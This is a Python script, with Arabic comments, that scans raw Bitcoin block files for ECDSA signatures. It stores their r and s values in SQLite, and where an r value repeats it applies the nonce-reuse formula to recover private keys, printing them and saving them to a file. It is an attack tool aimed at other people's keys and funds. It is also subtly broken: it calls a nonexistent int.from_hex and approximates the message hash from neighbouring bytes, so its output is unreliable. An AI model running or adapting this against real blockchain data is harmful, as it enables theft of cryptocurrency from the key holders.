import os
import hashlib
import binascii
import sqlite3
from ecdsa import util, numbertheory

# الثوابت الرياضية لمنحنى secp256k1
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def parse_der_signature(hex_sig):
    """تحليل توقيع DER لاستخراج r و s"""
    try:
        sig_bin = binascii.unhexlify(hex_sig)
        if sig_bin[0] != 0x30: return None, None
        r, s = util.sig_from_der(sig_bin[:-1])
        return r, s
    except:
        return None, None

def solve_private_key(r, s1, z1, s2, z2):
    """حساب المفتاح الخاص عند تكرار الـ r"""
    try:
        s_diff = (s1 - s2) % N
        s_diff_inv = pow(s_diff, N - 2, N)
        k = ((z1 - z2) * s_diff_inv) % N
        r_inv = pow(r, N - 2, N)
        d = ((s1 * k - z1) * r_inv) % N
        return hex(d)
    except:
        return None

def main():
    # المسارات
    BLOCKS_DIR = r"D:\blocks"
    DB_PATH = "data/local_forensic.db"
    
    if not os.path.exists(BLOCKS_DIR):
        print(f"[!] Error: Blocks directory not found at {BLOCKS_DIR}")
        return

    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS sigs (r TEXT, s TEXT, z TEXT, pub TEXT, txid TEXT)")
    cur.execute("CREATE INDEX IF NOT EXISTS idx_r ON sigs(r)")
    
    print(f"--- [Direct Disk Scanner Online] ---")
    print(f"Reading from: {BLOCKS_DIR}")

    # الحصول على قائمة ملفات blkXXXXX.dat
    blk_files = sorted([f for f in os.listdir(BLOCKS_DIR) if f.startswith('blk') and f.endswith('.dat')])
    
    for blk_file in blk_files:
        file_path = os.path.join(BLOCKS_DIR, blk_file)
        print(f"[*] Processing {blk_file}...")
        
        with open(file_path, "rb") as f:
            data = f.read()
            # هنا سنستخدم "بصمة" بسيطة للبحث عن التوقيعات داخل ملف الـ dat الخام
            # التوقيع يبدأ عادة بـ 30440220 أو 30450221
            # ملاحظة: هذه الطريقة "سريعة" (Heuristic) وتصلح للبحث المركز
            
            offset = 0
            while True:
                # البحث عن بداية توقيع DER (0x30 0x44 0x02 0x20)
                offset = data.find(b'\x30\x44\x02\x20', offset)
                if offset == -1: break
                
                try:
                    # استخراج r (32 bytes بعد 0x30440220)
                    r_bin = data[offset+4:offset+36]
                    r = int.from_hex(r_bin.hex())
                    
                    # استخراج s (تجاوز 0x02 0x20)
                    if data[offset+36:offset+38] == b'\x02\x20':
                        s_bin = data[offset+38:offset+70]
                        s = int.from_hex(s_bin.hex())
                        
                        # حساب z تقريبي (في الوضع المباشر بدون فك تشفير المعاملة بالكامل)
                        # سنستخدم جزء من البيانات المحيطة كـ z
                        z = int(hashlib.sha256(data[offset-32:offset]).hexdigest(), 16)
                        
                        cur.execute("SELECT s, z FROM sigs WHERE r=?", (str(r),))
                        match = cur.fetchone()
                        
                        if match and int(match[0]) != s:
                            pk = solve_private_key(r, int(match[0]), int(match[1]), s, z)
                            if pk:
                                print(f"\n[!!!] PRIVATE KEY FOUND: {pk}\n")
                                with open("found_keys_local.txt", "a") as out:
                                    out.write(f"Key: {pk}\n")
                        else:
                            cur.execute("INSERT INTO sigs VALUES (?,?,?,?,?)", 
                                        (str(r), str(s), str(z), "unknown", "raw_disk"))
                    
                except: pass
                offset += 70
        
        conn.commit()

if __name__ == "__main__":
    main()
